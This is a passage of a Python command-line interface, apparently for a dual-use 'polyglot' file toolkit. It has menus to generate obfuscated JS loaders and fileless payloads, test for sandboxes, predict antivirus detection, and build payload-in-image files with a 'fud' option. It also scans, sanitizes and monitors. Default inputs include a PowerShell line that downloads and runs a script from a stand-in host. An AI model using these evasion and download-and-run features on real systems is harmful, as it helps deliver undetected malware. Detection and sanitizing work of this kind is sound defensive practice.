            elif choice == "3":
                url = self.safe_input("[cyan]URL[/cyan]", default="http://e.com/l.js")
                if not url: return
                r = mutator.generate_js_loader(url)
                console.print(f"\n[yellow]Detection: {r.detection_score:.0%}[/yellow]\n{r.obfuscated_code}")
            elif choice == "4":
                p = self.safe_input("[cyan]Payload[/cyan]", default="IEX (New-Object Net.WebClient).DownloadString('http://e.com')")
                if not p: return
                r = mutator.generate_fileless(p)
                console.print(f"\n[yellow]Detection: {r.detection_score:.0%}[/yellow]\n{r.obfuscated_code}")
            elif choice == "5":
                lang = self.safe_input("[cyan]Lang[/cyan]", choices=["powershell","vba","javascript"])
                if lang: console.print(mutator.generate_sandbox_detector(lang))
            elif choice == "6":
                code = self.safe_input("[cyan]Code[/cyan]")
                if not code: return
                lang = self.safe_input("[cyan]Lang[/cyan]", choices=["powershell","vba","javascript"])
                if lang is None: return
                p = mutator.predict_av_behavior(code, lang)
                console.print(f"\n[yellow]Score: {p['detection_score']:.0%}[/yellow] - {p['verdict']}")
                for i in p.get('indicators',[]): console.print(f"  ! {i['trigger']}")
                for r in p.get('recommendations',[]): console.print(f"  -> {r}")
            elif choice == "7":
                code = self.safe_input("[cyan]Code[/cyan]")
                if not code: return
                lang = self.safe_input("[cyan]Lang[/cyan]", choices=["powershell","vba","javascript"])
                if lang is None: return
                risk = RiskScoringEngine().score_payload(code, lang)
                console.print(f"  [yellow]{risk.total}/100 ({risk.category})[/yellow]")
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")

    def menu_session_workspace(self):
        console.print()
        console.print(Panel("[bold green]SESSION & WORKSPACE[/bold green]", border_style="green"))
        console.print("  [green]1[/green] Sessions  [green]2[/green] Pinned  [green]3[/green] Recent")
        console.print("  [green]4[/green] Snapshots [green]5[/green] Restore [green]6[/green] Notes")
        console.print("  [green]7[/green] Chains    [green]8[/green] Export  [green]9[/green] Regex")
        console.print("  [green]10[/green] Auto-detect URLs/IPs/Domains")
        choice = self.safe_input("\n[bold green]Select[/bold green]", choices=[str(i) for i in range(1,11)], default="1")
        if choice is None: return
        try:
            from engines.workspace import WorkspaceManager, SessionManager, RegexTester, auto_detect_targets
            wm = WorkspaceManager()
            sm = SessionManager()
            if choice == "1":
                for i, s in enumerate(sm.list_sessions()[:10]):
                    console.print(f"  {i+1}. {s.get('name','')} [{s.get('status','')}]")
                a = self.safe_input("[cyan]new/view[/cyan]", choices=["new","view"])
                if a == "new":
                    n = self.safe_input("[cyan]Name[/cyan]")
                    if n: console.print(f"[green]Created: {sm.create_session(n)['id']}[/green]")
            elif choice == "2":
                for p in wm.get_pinned(): console.print(f"  pin {p['name']}")
                f = self.safe_input("[cyan]File to pin[/cyan]")
                if f and os.path.exists(f): wm.pin_file(f); console.print("[green]Pinned[/green]")
            elif choice == "3":
                for r in wm.get_recent(): console.print(f"  {r['name']}")
            elif choice == "4":
                a = self.safe_input("[cyan]create/list/restore[/cyan]", choices=["create","list","restore"])
                if a == "list":
                    for s in wm.list_snapshots()[:20]: console.print(f"  snap {s['snapshot_name']}")
                elif a == "create":
                    f = self.safe_input("[cyan]File[/cyan]")
                    if f and os.path.exists(f): r = wm.create_snapshot(f); console.print(f"[green]{r['snapshot_name']}[/green]")
                elif a == "restore":
                    n = self.safe_input("[cyan]Name[/cyan]")
                    if n: r = wm.restore_snapshot(n); console.print(f"[green]Restored: {r.get('restored','')}[/green]")
            elif choice == "5":
                f = self.safe_input("[cyan]Deleted file[/cyan]")
                if f: r = wm.restore_deleted(f); console.print(f"[green]{r}[/green]" if r else "[red]Not found[/red]")
            elif choice == "6":
                for n in wm.list_notes(): console.print(f"  note {n['name']}")
                a = self.safe_input("[cyan]new/view[/cyan]", choices=["new","view"])
                if a == "new":
                    n = self.safe_input("[cyan]Name[/cyan]"); c = self.safe_input("[cyan]Content[/cyan]")
                    if n and c: wm.save_note(n, c); console.print("[green]Saved[/green]")
                elif a == "view":
                    n = self.safe_input("[cyan]Name[/cyan]")
                    if n: c = wm.load_note(n); console.print(c if c else "[dim]Not found[/dim]")
            elif choice == "7":
                for c in wm.list_chains(): console.print(f"  chain {c['name']} ({c.get('commands',0)} cmds)")
            elif choice == "8":
                a = self.safe_input("[cyan]export/import[/cyan]", choices=["export","import"])
                if a == "export":
                    p = self.safe_input("[cyan]Path[/cyan]", default="workspace.zip")
                    if p: r = wm.export_workspace(p); console.print(f"[green]Exported: {r['exported']}[/green]")
                elif a == "import":
                    p = self.safe_input("[cyan]Zip[/cyan]")
                    if p: wm.import_workspace(p); console.print("[green]Imported[/green]")
            elif choice == "9":
                t = RegexTester()
                p = self.safe_input("[cyan]Pattern[/cyan]"); s = self.safe_input("[cyan]String[/cyan]")
                if p and s is not None:
                    r = t.test(p, s)
                    if r.get("valid"):
                        console.print(f"[green]{r['match_count']} matches[/green]")
                        for m in r.get("matches",[]): console.print(f"  [{m['start']}:{m['end']}] '{m['text']}'")
                    else: console.print(f"[red]{r.get('error')}[/red]")
            elif choice == "10":
                text = self.safe_input("[cyan]Text[/cyan]")
                if text:
                    targets = auto_detect_targets(text)
                    for k,v in targets.items():
                        if v: console.print(f"  [bold]{k}:[/bold] {', '.join(v)}")
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")

    def menu_network_tools(self):
        console.print()
        console.print(Panel("[bold cyan]NETWORK TOOLS[/bold cyan]", border_style="cyan"))
        console.print("  [cyan]1[/cyan] DNS Lookup  [cyan]2[/cyan] Whois  [cyan]3[/cyan] TCP Connect")
        console.print("  [cyan]4[/cyan] Raw Request [cyan]5[/cyan] History [cyan]6[/cyan] Auto-detect")
        choice = self.safe_input("\n[bold cyan]Select[/bold cyan]", choices=["1","2","3","4","5","6"], default="1")
        if choice is None: return
        try:
            from engines.network_tools import DNSLookup, WhoisLookup, TCPConnectTester, RawRequestEditor, RequestHistory, auto_detect_targets
            if choice == "1":
                domain = self.safe_input("[cyan]Domain[/cyan]")
                if not domain: return
                rtype = self.safe_input("[cyan]Type[/cyan]", choices=["A","AAAA","MX","NS","TXT","full"], default="A")
                dns = DNSLookup()
                if rtype == "full":
                    for rt, d in dns.full_lookup(domain).items():
                        console.print(f"  [bold]{rt}:[/bold] {d.get('results',[])}")
                else:
                    r = dns.lookup(domain, rtype)
                    for v in r.get("results",[]): console.print(f"    {v}")
            elif choice == "2":
                target = self.safe_input("[cyan]Domain/IP[/cyan]")
                if not target: return
                r = WhoisLookup().lookup(target)
                for k,v in r.get("parsed",{}).items(): console.print(f"  [bold]{k}:[/bold] {v}")
            elif choice == "3":
                host = self.safe_input("[cyan]Host[/cyan]")
                if not host: return
                port = self.safe_input("[cyan]Port[/cyan]", default="80")
                if port is None: return
                if port == "common":
                    for r in TCPConnectTester().common_ports_scan(host):
                        icon = "OPEN" if r.get("open") else "CLOSED"
                        console.print(f"  {host}:{r['port']} {icon}")
                else:
                    r = TCPConnectTester().test(host, int(port))
                    console.print(f"  {'OPEN' if r.get('open') else 'CLOSED'} ({r.get('latency_ms','')}ms)")
            elif choice == "4":
                editor = RawRequestEditor()
                console.print("[dim]Enter raw HTTP request:[/dim]")
                lines = []
                while True:
                    line = self.safe_input("")
                    if not line: break
                    lines.append(line)
                raw = "\r\n".join(lines)
                if raw:
                    parsed = editor.parse(raw)
                    console.print(f"  {parsed.get('method','')} {parsed.get('path','')} Host: {parsed.get('host','')}")
                    send = self.safe_confirm("[cyan]Send?[/cyan]", default=False)
                    if send and parsed.get('host'):
                        resp = editor.send(raw, parsed['host'])
                        console.print(f"  Status: {resp.get('status_code', resp.get('error',''))}")
            elif choice == "5":
                h = RequestHistory()
                for e in h.get(limit=20): console.print(f"  {e.get('host','')} -> {e.get('status_code','')}")
            elif choice == "6":
                text = self.safe_input("[cyan]Text[/cyan]")
                if text:
                    t = auto_detect_targets(text)
                    for k,v in t.items():
                        if v: console.print(f"  [bold]{k}:[/bold] {', '.join(v)}")
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")

    def menu_hex_editor(self):
        console.print()
        console.print(Panel("[bold yellow]HEX EDITOR[/bold yellow]", border_style="yellow"))
        console.print("  [yellow]1[/yellow] Hex Dump (polyglot red-marks)  [yellow]2[/yellow] Search Hex")
        console.print("  [yellow]3[/yellow] Search ASCII                  [yellow]4[/yellow] Entropy Map")
        console.print("  [yellow]5[/yellow] Diff Files                    [yellow]6[/yellow] Format Detection")
        choice = self.safe_input("\n[bold yellow]Select[/bold yellow]", choices=["1","2","3","4","5","6"], default="1")
        if choice is None: return
        try:
            from engines.hex_editor import HexEditor
            ed = HexEditor()
            if choice == "1":
                fpath = self.safe_input("[cyan]File[/cyan]")
                if not fpath or not os.path.exists(fpath): return
                result = ed.hex_dump(fpath, length=2048)
                console.print(f"\n[bold]{fpath}[/bold] ({result['file_size']:,} bytes)")
                for line in result["lines"]:
                    addr = f"{line['offset']:08x}"
                    hex_s = " ".join(v for v, _ in line["hex"])
                    ascii_s = "".join(v for v, _ in line["ascii"])
                    has_red = any(c == "red" for _, c in line["hex"])
                    style = "bold red" if has_red else "dim"
                    console.print(f"  [{style}]{addr}  {hex_s:<48s}  |{ascii_s}|[/{style}]")
                    for ann in line.get("annotations",[]): console.print(f"    [bold red]>> {ann}[/bold red]")
                if result.get("extra_data_offset") is not None:
                    console.print(f"\n  [bold red]POLYGLOT: Extra data at 0x{result['extra_data_offset']:x}[/bold red]")
            elif choice == "2":
                fpath = self.safe_input("[cyan]File[/cyan]"); p = self.safe_input("[cyan]Hex pattern[/cyan]")
                if fpath and p:
                    for r in ed.search_hex(fpath, p)[:20]:
                        console.print(f"  [{r['hex_offset']}] {r.get('context_hex','')[:60]}")
            elif choice == "3":
                fpath = self.safe_input("[cyan]File[/cyan]"); p = self.safe_input("[cyan]String[/cyan]")
                if fpath and p:
                    for r in ed.search_ascii(fpath, p)[:20]:
                        console.print(f"  [{r['hex_offset']}] {r.get('context','')[:60]}")
            elif choice == "4":
                fpath = self.safe_input("[cyan]File[/cyan]")
                if fpath:
                    blocks = ed.entropy_map(fpath)
                    for b in blocks[:48]:
                        bar = "X" * b["bar"]
                        s = {"red":"bold red","yellow":"yellow","green":"green"}.get(b["color"],"white")
                        console.print(f"  [{s}]{bar:<80s}[/{s}] {b['entropy']:.2f}")
            elif choice == "5":
                f1 = self.safe_input("[cyan]File 1[/cyan]"); f2 = self.safe_input("[cyan]File 2[/cyan]")
                if f1 and f2:
                    r = ed.diff_view(f1, f2)
                    console.print(f"  Diffs: {r['total_diffs']}")
                    for d in r["differences"][:20]:
                        console.print(f"  0x{d['offset']:08x}: {d['diff_count']} bytes differ")
            elif choice == "6":
                fpath = self.safe_input("[cyan]File[/cyan]")
                if fpath and os.path.exists(fpath):
                    with open(fpath, "rb") as f: data = f.read(1024)
                    regions = ed._detect_regions(data, 0)
                    for r in regions:
                        s = {"green":"green","red":"bold red","yellow":"yellow","cyan":"cyan"}.get(r.color,"white")
                        console.print(f"  [{s}]{r.name}[/{s}] 0x{r.start:x}-0x{r.end:x}: {r.description}")
                    if not regions: console.print("[dim]No format detected.[/dim]")
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")

    def menu_exploitation(self):
        console.print()
        console.print(Panel("[bold red]EXPLOITATION & ATTACK PATHS[/bold red]", border_style="red"))
        console.print("  [red]1[/red] Vulnerability Correlation  [red]2[/red] Credential Chain Analysis")
        console.print("  [red]3[/red] Attack Chain Analysis      [red]4[/red] Risk Scoring")
        console.print("  [red]5[/red] Generate Report (MD/PDF)")
        choice = self.safe_input("\n[bold red]Select[/bold red]", choices=["1","2","3","4","5"], default="1")
        if choice is None: return
        try:
            from engines.risk_engine import RiskScoringEngine, VulnCorrelator, CredentialChainAnalyzer, AttackChainAnalyzer, ReportGenerator
            if choice == "1":
                fpath = self.safe_input("[cyan]File[/cyan]")
                if not fpath or not os.path.exists(fpath): return
                with open(fpath, "rb") as f: data = f.read()
                vulns = VulnCorrelator().correlate(data)
                if vulns:
                    for v in vulns:
                        icon = "CRIT" if v["severity"] == "critical" else "HIGH"
                        console.print(f"  [{icon}] {v['cve']} ({v['name']}): {v['description']}")
                else: console.print("[green]No known vuln patterns found.[/green]")
            elif choice == "2":
                fpath = self.safe_input("[cyan]File[/cyan]")
                if not fpath or not os.path.exists(fpath): return
                with open(fpath, "rb") as f: data = f.read()
                creds = CredentialChainAnalyzer().analyze(data)
                if creds:
                    for c in creds: console.print(f"  [{c['category']}] {c['masked_value']}")
                else: console.print("[green]No credentials found.[/green]")
            elif choice == "3":
                console.print("[dim]Run a scan first, then analyze the chain.[/dim]")
                chain = AttackChainAnalyzer().analyze_chain([])
                console.print(f"  Stages: {chain['stages_activated']}")
            elif choice == "4":
                fpath = self.safe_input("[cyan]File[/cyan]")
                if fpath and os.path.exists(fpath):
                    risk = RiskScoringEngine().score_file(fpath, {})
                    console.print(f"\n  [yellow]Score: {risk.total}/100 ({risk.category})[/yellow]")
                    for f, v in sorted(risk.factors.items(), key=lambda x: -x[1]):
                        bar = "X" * int(v * 10) + "." * (10 - int(v * 10))
                        console.print(f"  {f}: {bar} {v:.0%}")
                    for d in risk.details: console.print(f"  * {d}")
                    for r in risk.recommendations: console.print(f"  -> {r}")
            elif choice == "5":
                fpath = self.safe_input("[cyan]File[/cyan]")
                if not fpath: return
                rg = ReportGenerator()
                risk = RiskScoringEngine().score_file(fpath, {})
                md_path = rg.generate_markdown({}, risk_score=risk)
                console.print(f"[green]Report: {md_path}[/green]")
                pdf = rg.generate_pdf(md_path)
                if pdf: console.print(f"[green]PDF/HTML: {pdf}[/green]")
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")

    def menu_blue_side(self):
        console.print()
        console.print(Panel("[bold blue]BLUE SIDE MONITORING[/bold blue]", border_style="blue"))
        console.print("  [blue]1[/blue] Network Logs       [blue]2[/blue] Request History")
        console.print("  [blue]3[/blue] WebSocket Monitor  [blue]4[/blue] DNS Lookup")
        console.print("  [blue]5[/blue] Whois Lookup       [blue]6[/blue] TCP Connect Tester")
        console.print("  [blue]7[/blue] Connection Viewer  [blue]8[/blue] Process Viewer")
        console.print("  [blue]9[/blue] File Change Monitor")
        choice = self.safe_input("\n[bold blue]Select[/bold blue]",
                                 choices=[str(i) for i in range(1,10)], default="1")
        if choice is None: return
        try:
            from engines.network_tools import DNSLookup, WhoisLookup, TCPConnectTester, RequestHistory

            if choice == "1":
                h = RequestHistory()
                for e in h.get(limit=30):
                    console.print(f"  [{e.get('timestamp','')}] {e.get('method','')} {e.get('host','')}{e.get('path','')} -> {e.get('status_code','')}")
                if not h.get(limit=1): console.print("[dim]No network logs yet.[/dim]")
            elif choice == "2":
                self._request_history()
            elif choice == "3":
                console.print("[dim]WebSocket monitoring watches for WS upgrade requests in network logs.[/dim]")
                h = RequestHistory()
                ws_events = [e for e in h.get(limit=100) if 'upgrade' in str(e).lower() or 'websocket' in str(e).lower()]
                if ws_events:
                    for e in ws_events: console.print(f"  WS: {e.get('host','')} {e.get('path','')}")
                else: console.print("[dim]No WebSocket events found.[/dim]")
            elif choice == "4":
                domain = self.safe_input("[cyan]Domain[/cyan]")
                if domain:
                    r = DNSLookup().full_lookup(domain)
                    for rt, d in r.items():
                        console.print(f"  [bold]{rt}:[/bold] {d.get('results',[])}")
            elif choice == "5":
                target = self.safe_input("[cyan]Domain/IP[/cyan]")
                if target:
                    r = WhoisLookup().lookup(target)
                    for k,v in r.get("parsed",{}).items(): console.print(f"  [bold]{k}:[/bold] {v}")
            elif choice == "6":
                host = self.safe_input("[cyan]Host[/cyan]")
                if host:
                    port = self.safe_input("[cyan]Port[/cyan]", default="80")
                    if port:
                        r = TCPConnectTester().test(host, int(port))
                        console.print(f"  {'OPEN' if r.get('open') else 'CLOSED'} ({r.get('latency_ms','')}ms)")
            elif choice == "7":
                self._connection_viewer()
            elif choice == "8":
                self._process_viewer()
            elif choice == "9":
                self._file_change_monitor()
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")

    def _request_history(self):
        try:
            from engines.network_tools import RequestHistory
            h = RequestHistory()
            for e in h.get(limit=30):
                console.print(f"  [{e.get('timestamp','')}] {e.get('host','')} -> {e.get('status_code','')}")
            if not h.get(limit=1): console.print("[dim]No requests logged yet.[/dim]")
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")

    def _raw_request_editor(self):
        try:
            from engines.network_tools import RawRequestEditor
            editor = RawRequestEditor()
            console.print("[dim]Enter raw HTTP request (empty line to end):[/dim]")
            lines = []
            while True:
                line = self.safe_input("")
                if not line: break
                lines.append(line)
            raw = "\r\n".join(lines)
            if raw:
                parsed = editor.parse(raw)
                console.print(f"  {parsed.get('method','')} {parsed.get('path','')} Host: {parsed.get('host','')}")
                send = self.safe_confirm("[cyan]Send?[/cyan]", default=False)
                if send and parsed.get('host'):
                    resp = editor.send(raw, parsed['host'])
                    console.print(f"  Status: {resp.get('status_code', resp.get('error',''))}")
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")


# ── Direct CLI Commands ──────────────────────────────────────

def cli_build(args):
    """polyglot build <cover> <payload> [options]"""
    if len(args) < 2:
        console.print("[red]Usage: polyglot build <cover> <payload> [--type jpeg] [--encrypt] [--fud] [--mime][/red]")
        return

    cover, payload = args[0], args[1]
    container = "jpeg"
    encrypt = fud = mime = False
    output = None

    i = 2
    while i < len(args):
        if args[i] == "--type" and i+1 < len(args):
            container = args[i+1]; i += 2
        elif args[i] == "--encrypt":
            encrypt = True; i += 1
        elif args[i] == "--fud":
            fud = True; i += 1
        elif args[i] == "--mime":
            mime = True; i += 1
        elif args[i] == "--output" and i+1 < len(args):
            output = args[i+1]; i += 2
        else:
            i += 1

    if not output:
        output = f"polyglot.{container}"

    b = PolyglotBuilder()
    try:
        stats = b.build(cover, payload, output, container, encrypt, fud, mime)
        if HAS_RICH:
            table = Table(box=box.ROUNDED, border_style="green")
            table.add_column("Property", style="cyan")
            table.add_column("Value")
            for k, v in stats.items():
                table.add_row(str(k), str(v))
            console.print(table)
        else:
            for k, v in stats.items():
                print(f"  {k}: {v}")
    except Exception as e:
        print(f"ERROR: {e}", file=sys.stderr)
        sys.exit(1)


def cli_scan(args):
    """polyglot scan <file_or_dir>"""
    if not args:
        print("Usage: polyglot scan <file_or_dir>", file=sys.stderr)
        return

    target = args[0]
    d = PolyglotDetector()

    if os.path.isfile(target):
        files = [target]
    elif os.path.isdir(target):
        exts = {'.jpg','.jpeg','.png','.gif','.bmp','.pdf','.doc','.docx',
                '.zip','.exe','.dll','.bat','.cmd','.ps1','.vbs','.js','.mp4'}
        files = []
        for root, dirs, fnames in os.walk(target):
            dirs[:] = [d for d in dirs if not d.startswith('.')]
            for f in fnames:
                if os.path.splitext(f)[1].lower() in exts:
                    files.append(os.path.join(root, f))
    else:
        print(f"Not found: {target}", file=sys.stderr)
        sys.exit(1)

    threats = 0
    for fpath in files:
        fname = os.path.basename(fpath)
        try:
            findings = d.scan_file(fpath)
            crit = [f for f in findings if f['severity'] in ('critical','high')]
            if crit:
                threats += len(crit)
                if HAS_RICH:
                    console.print(f"[bold red]⚠ {fname}[/bold red]")
                    for f in findings:
                        console.print(f"  [{f['severity']}] {f['type']}: {f['detail']}")
                else:
                    print(f"⚠ {fname}")
                    for f in findings:
                        print(f"  [{f['severity']}] {f['type']}: {f['detail']}")
            else:
                if HAS_RICH:
                    console.print(f"[green]✓ {fname}[/green]")
                else:
                    print(f"✓ {fname}")
        except Exception as e:
            print(f"✗ {fname} — error: {e}")

    if HAS_RICH:
        console.print(f"\n[bold]{'THREATS: '+str(threats) if threats else 'ALL CLEAN'}[/bold] — {len(files)} files")
    else:
        print(f"\n{'THREATS: '+str(threats) if threats else 'ALL CLEAN'} — {len(files)} files")


def cli_sanitize(args):
    """polyglot sanitize <file_or_dir> [--no-backup] [--dry-run]"""
    if not args:
        print("Usage: polyglot sanitize <file_or_dir> [--no-backup] [--dry-run]", file=sys.stderr)
        return

    target = args[0]
    backup = "--no-backup" not in args
    dry_run = "--dry-run" in args
    s = PolyglotSanitizer()

    if os.path.isfile(target):
        files = [target]
    elif os.path.isdir(target):
        exts = {'.jpg','.jpeg','.png','.gif','.bmp','.pdf','.zip','.mp4'}
        files = []
        for root, dirs, fnames in os.walk(target):
            dirs[:] = [d for d in dirs if not d.startswith('.')]
            for f in fnames:
                if os.path.splitext(f)[1].lower() in exts:
                    files.append(os.path.join(root, f))
    else:
        print(f"Not found: {target}", file=sys.stderr)
        sys.exit(1)

    if dry_run:
        print("  [DRY-RUN MODE — no files will be modified]\n")

    for fpath in files:
        fname = os.path.basename(fpath)
        prefix = "[DRY-RUN] " if dry_run else ""
        try:
            result = s.sanitize(fpath, backup and not dry_run)
            if result.get('safe_metadata'):
                print(f"{prefix}○ {fname} — {result['detail']} (safe)")
            elif result['status'] == 'sanitized':
                print(f"{prefix}✓ {fname} — {result['detail']}")
            else:
                print(f"{prefix}○ {fname} — {result['detail']}")
        except Exception as e:
            print(f"{prefix}✗ {fname} — error: {e}")


# ── Entry Point ──────────────────────────────────────────────

def main():
    args = sys.argv[1:]

    if not args:
        # No args → interactive TUI
        tui = PolyglotTUI()
        tui.main_menu()
    elif args[0] == "tui":
        tui = PolyglotTUI()
        tui.main_menu()
    elif args[0] == "build":
        cli_build(args[1:])
    elif args[0] == "scan":
        cli_scan(args[1:])
    elif args[0] == "sanitize":
        cli_sanitize(args[1:])
    elif args[0] == "monitor":
        tui = PolyglotTUI()
        tui.menu_monitor(cli_directory=args[1] if len(args) > 1 else None)
    elif args[0] == "report":
        tui = PolyglotTUI()
        if len(args) < 2:
            print("Usage: polyglot report <file_or_dir>", file=sys.stderr)
            sys.exit(1)
        # Directly call menu_report but set target automatically
        import unittest.mock
        with unittest.mock.patch.object(tui, 'safe_input', side_effect=[args[1], "all"]):
            tui.menu_report()
    elif args[0] in ("help", "--help", "-h"):
        print(__doc__)
    else:
        print(f"Unknown command: {args[0]}", file=sys.stderr)
        print("Commands: tui, build, scan, sanitize, monitor, report, help", file=sys.stderr)
        sys.exit(1)


if __name__ == '__main__':
    main()
